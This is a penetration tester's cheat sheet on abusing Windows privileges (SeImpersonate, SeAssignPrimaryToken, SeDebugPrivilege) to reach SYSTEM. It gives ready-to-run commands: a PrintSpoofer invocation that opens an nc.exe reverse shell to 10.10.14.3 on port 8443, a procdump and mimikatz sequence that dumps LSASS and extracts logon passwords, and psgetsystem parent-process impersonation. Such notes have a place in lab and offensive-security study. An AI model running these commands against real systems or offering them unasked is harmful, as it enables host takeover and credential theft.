
# Windows User Privileges

## SeImpersonate and SeAssignPrimaryToken

- Essentially, the Potato attack tricks a process running as SYSTEM to connect to their process, which hands over the token to be used and gain NT AUTHORITY\SYSTEM level access.
- We will often run into this privilege after gaining remote code execution via an application that runs in the context of a service account (for example, uploading a web shell to an ASP.NET web application, achieving remote code execution through a Jenkins installation, or by executing commands through MSSQL queries).
- tools
  - [JuicyPotato](https://github.com/ohpe/juicy-potato). JuicyPotato doesn't work on `Windows Server 2019` and `Windows 10 build 1809 onwards`.
  - [PrintSpoofer](https://github.com/itm4n/PrintSpoofer). work on Windows 10 and Server 2016/2019.
  - [RoguePotato](https://github.com/antonioCoco/RoguePotato). 

### check 
```powershell
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled    
```


### PrintSpoofer
```powershell
c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"

```

## SeDebugPrivilege
- To run a particular application or service or assist with troubleshooting, a user might be assigned the SeDebugPrivilege instead of adding the account into the administrators group.
- it can be used to capture sensitive information from system memory, or access/modify kernel and application structures.



### check
```
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeDebugPrivilege                          Debug programs                                                     Enabled
```

### Dump Memory
```powershell
procdump.exe -accepteula -ma lsass.exe lsass.dmp

mimikatz.exe "log" "privilege::debug" "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords" exit
```

### RCE
-  If we target a parent process running as SYSTEM (specifying the Process ID (or PID) of the target process or running program), then we can elevate our rights quickly
- [psgetsystem](https://github.com/decoder-it/psgetsystem)




```powershell
# get a listing of running processes and accompanying PIDs.
tasklist 

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System Idle Process              0 Services                   0          4 K
System                           4 Services                   0        116 K
smss.exe                       340 Services                   0      1,212 K
csrss.exe                      444 Services                   0      4,696 K
wininit.exe                    548 Services                   0      5,240 K
csrss.exe                      556 Console                    1      5,972 K
winlogon.exe                   612 Console                    1     10,408 K

# we can target winlogon.exe running under PID 612, which we know runs as SYSTEM on Windows hosts.
Import-Module .\psgetsys.ps1 

ImpersonateFromParentPid -ppid <parentpid> -command <command to execute> -cmdargs <command arguments>
```
